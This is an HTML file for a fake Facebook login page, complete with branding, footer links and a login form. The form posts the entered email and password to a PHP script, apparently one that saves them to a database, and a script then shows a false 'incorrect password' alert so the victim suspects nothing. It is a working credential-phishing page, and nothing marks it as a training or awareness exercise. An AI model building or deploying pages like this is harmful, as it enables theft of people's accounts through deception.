<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Form</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <section class="mainwrapper">
        <div class="branding">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>

        <div>
            <div class="panel">
                <form action="/fbpage/facebook_inserter_db.php" method="post">
                    <input type="email" name="email" id="email" placeholder="Email or phone number" required><br>
                    <input type="password" name="password" id="password" placeholder="Password" required><br>
                    <!-- <input class="loginbutton" name="submit" type="submit" value="Log In"></input> -->
                    <input class="loginbutton" type="submit" onclick="myFunction()" value="Log In"></input>

                </form>
                <a class="forgotps" href="#">Forgot Password?</a>
                <hr>
                <a class="register" href="#">Create New Account</a>
            </div>
            <div class="bottom-link">
                <a class="page" href="#">Create a Page </a>
                <p>for a celebrity, brand or business.</p>
            </div>
        </div>
    </section>

    <footer>
        <ul>
            <li><a class="footerl" href="#">Sign Up</a></li>
            <li><a class="footerl" href="#">Log In</a></li>
            <li><a class="footerl" href="#">Messenger</a></li>
            <li><a class="footerl" href="#">Facebook Lite</a></li>
            <li><a class="footerl" href="#">Vido</a></li>
            <li><a class="footerl" href="#">Places</a></li>
            <li><a class="footerl" href="#">Games</a></li>
            <li><a class="footerl" href="#">Marketplace</a></li>
            <li><a class="footerl" href="#">Meta Play</a></li>
            <li><a class="footerl" href="#">Meta Store</a></li>
            <li><a class="footerl" href="#">Meta Quest</a></li>
            <li><a class="footerl" href="#">Instagram</a></li>
            <li><a class="footerl" href="#">Threads</a></li>
            <li><a class="footerl" href="#">Fundraisers</a></li>
            <li><a class="footerl" href="#">Services</a></li>
            <li><a class="footerl" href="#">Privacy Policy</a></li>
            <li><a class="footerl" href="#">Privacy Center</a></li>
            <li><a class="footerl" href="#">Groups</a></li>
            <li><a class="footerl" href="#">About</a></li>
            <li><a class="footerl" href="#">Create ad</a></li>

        </ul>
    </footer>

    <script>
        // When the user Clicks enter after entering the credentials this will evoke function and will pop an alert .. !
        function myFunction() {
            alert("Your entered Email/Password are incorrect ,Please check and try again.");
        }
    </script>
</body>

</html>